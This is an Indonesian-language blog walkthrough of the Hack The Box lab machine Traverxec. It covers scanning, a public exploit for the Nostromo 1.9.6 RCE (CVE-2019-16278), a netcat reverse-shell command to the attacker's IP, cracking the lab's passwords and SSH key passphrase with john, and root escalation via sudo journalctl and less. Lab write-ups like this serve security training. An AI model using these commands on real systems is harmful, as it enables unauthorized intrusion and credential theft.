---
layout: post
title:  "Traverxec – [Hack The Box] Walkthrough"
date:   2020-09-06 13:35:57 +0700
categories: pentest
tags: [Pentest]
---
![traverxec_banner](/assets/images/traverxec/banner.png "Traverxec Banner")
## Hack The Box?

Berhubung ini adalah artikel pertama yang saya buat di blog ini, maka saya akan sedikit menjelaskan dulu apa itu Hack The Box.

> Hack The Box is an online platform allowing you to test your penetration testing skills and exchange ideas and methodologies with thousands of people in the security field.

Singkatnya, HTB adalah online platform yang memungkinkan kita untuk menguji kemampuan penetration testing pada lab yang telah disediakan dan akan selalu di perbaharui.  
Selain menyediakan lab untuk meretas machine, HTB juga mempunyai beberapa tantangan lainnya, contohnya Capture The Flag (CTF).  
Nah kali ini saya akan membahas salah satu machine yang bernama Traverxec.

## Machine Details
- OS : Linux
- Difficulty : Easy
- Points : 20
- Release : 16 Nov 2019
- IP : 10.10.10.165

### Reconnaisance & Enumeration
Pertama lakukan enumerasi menggunakan nmap untuk mendapatkan informasi lebih lanjut tentang service yang tersedia pada machine ini.

```bash
nmap -sV -sC 10.10.10.165
```

Setelah menunggu, berikut adalah hasil yang didapatkan dari nmap.

![walk-1](/assets/images/traverxec/1.png)

Terdapat beberapa service yang terbuka yaitu SSH dan HTTP dan menggunakan Nostromo v.1.9.6 sebagai web servernya. Saat web dibuka ternyata hanya menampilkan sebuah website statis.

![walk-2](/assets/images/traverxec/2.png)

Setelah mencari tau lebih lanjut tentang nostromo 1.9.6 ternyata server yang digunakan mempunyai bug Directory Traversal yang bisa mengarah ke serangan RCE via crafted HTTP request.  
Referensi : [CVE-2019-16278](https://www.cvedetails.com/cve/CVE-2019-16278/).

### Gaining Access
Kebetulan sudah ada exploit yang dibuat oleh seorang pentester yang bisa di dapatkan di  
[exploit-db nostromo 1.9.6 – Remote Code Execution](https://www.exploit-db.com/exploits/47837). Langsung saja kita jalankan exploit tersebut.

```bash
python cve2019_16278.py 10.10.10.165 80 "uname -a"
```

![walk-3](/assets/images/traverxec/3.png)

Terlihat bahwa server me-response command “uname -a” yang di berikan. Untuk mempermudah maka kita akan lakukan reverse shell ke server tersebut. Pertama listen netcat di local.

```bash
nc -lvp 1131
```

Lalu lakukan reverse shell ke server

```bash
python cve2019_16278.py 10.10.10.165 80 "/bin/nc.traditional -e /bin/sh 10.10.14.76 1131"
```

![walk-4](/assets/images/traverxec/4.png)

Shell sudah terkoneksi, lalu spawn pty shell menggunakan python agar bash lebih enak dilihat

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Sesuai dengan soalnya, pertama kita harus mendapatkan flag user (user.txt) yang terdapat di direktori /home/{user}/

![walk-5](/assets/images/traverxec/5.png)

Namun saat membuka direktorinya ternyata kita tidak mempunyai akses ke direktori tersebut, terpaksa harus mencari cara lain agar bisa mengakses flag tersebut.

![walk-6](/assets/images/traverxec/6.png)

Setelah mencari cari , ditemukan file **.htpasswd** dan **nhttpd.conf** nya di direktori /var/www/nostromo/conf

![walk-7](/assets/images/traverxec/7.png)

Crack htpasswd tersebut menggunakan **john** dengan wordlist **rockyou.txt** dan didapatkan plaintext dari passwordnya si david, yaitu :
**Nowonly4me**

![walk-8](/assets/images/traverxec/8.png)

Lanjut cek isi dari nhttpd.conf nya, dan ditemukan HOMDIRS di /home/public_www dan setelah di cek isinya terdapat ‘protected-file-area’

![walk-9](/assets/images/traverxec/9.png)

![walk-10](/assets/images/traverxec/10.png)

Didalam folder tersebut berisi backup-ssh yang mungkin bisa dipakai untuk login ke ssh target

![walk-11](/assets/images/traverxec/11.png)

Untuk mendapatkan file tersebut ternyata kita bisa melakukan cara lain. Jadi rencana nya nanti kita akan membuat file berdasarkan base64 yang telah di encode tadi lalu di decode kembali agar file nya kembali seperti semula.  
Referensi : [Gzip Base64 Encode](https://stackoverflow.com/questions/42459909/gzip-base64-encode-and-decode-string-on-both-linux-and-windows)

```bash
cat backup-ssh-identity-files.tgz | base64 –w0
```

![walk-12](/assets/images/traverxec/12.png)

Buat file yang berisi base64 tersebut dan men-decode nya seperti semula

```bash
cat encoded_ssh.txt | base64 -d > backup-ssh-identity-files.tgz
```

![walk-13](/assets/images/traverxec/13.png)

Terdapat beberapa file ssh didalam zip, namun key tersebut menggunakan passphare . Untuk crack passphare dari id_rsa tersebut kita bisa menggunakan john. Namun id_rsa harus dirubah menjadi hash terlebih dahulu menggunakan ssh2john.

```bash
python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
```

Lalu crack passphare nya menggunakan wordlist rockyou.txt

```bash
john id_rsa.hash --wordlist=/home/bio/netsec/wordlists/rockyou.txt
```

![walk-14](/assets/images/traverxec/14.png)

Passphare berhasil di dapatkan :  
**hunter** (id_rsa)  
Langsung saja connect ke SSH menggunakan key dan passphare yang sudah di dapatkan.

![walk-15](/assets/images/traverxec/15.png)

Akhirnya, kita berhasil login ke dalam machine tersebut sebagai david, maka flag user berhasil di dapatkan.

![walk-16](/assets/images/traverxec/16.png)

### Privilege Escalation

Nah, sekarang saatnya untuk mendapatkan flag root **(root.txt)** nya yang berada di **/root/**.  
Setelah melihat isi direktori home nya si david, terdapat folder bin yang berisi file script yang sepertinya untuk melihat status dari server webnya.

![walk-17](/assets/images/traverxec/17.png)

Setelah mencari informasi ternyata **journalctl** bisa di eksploitasi, ketika ukuran layar terminal dikecilkan maka output dari file tidak akan tampil seutuhnya dan otomatis menjalankan fungsi/command **“less”** yang bisa digunakan untuk melakukan command didalam shell.

Referensi :
- [GTFOB Less](https://gtfobins.github.io/gtfobins/less/)
- [GTFOB Journalctl](https://gtfobins.github.io/gtfobins/journalctl/)

Karna **journalctl** tadi dijalankan langsung menggunakan sudo (/usr/bin/sudo) maka **journalctl** mempunyai permission dari superuser.

![walk-18](/assets/images/traverxec/18.png)

Akhirnya akses root pun berhasil kita dapatkan, dan selesailah misi kita pada kali ini.

## References
- [CVE-2019-16278](https://www.cvedetails.com/cve/CVE-2019-16278/)
- [Exploit-db nostromo 1.9.6 – Remote Code Execution](https://www.exploit-db.com/exploits/47837)
- [Gzip Base64 Encode](https://stackoverflow.com/questions/42459909/gzip-base64-encode-and-decode-string-on-both-linux-and-windows)
- [GTFOB Less](https://gtfobins.github.io/gtfobins/less/)
- [GTFOB Journalctl](https://gtfobins.github.io/gtfobins/journalctl/)

























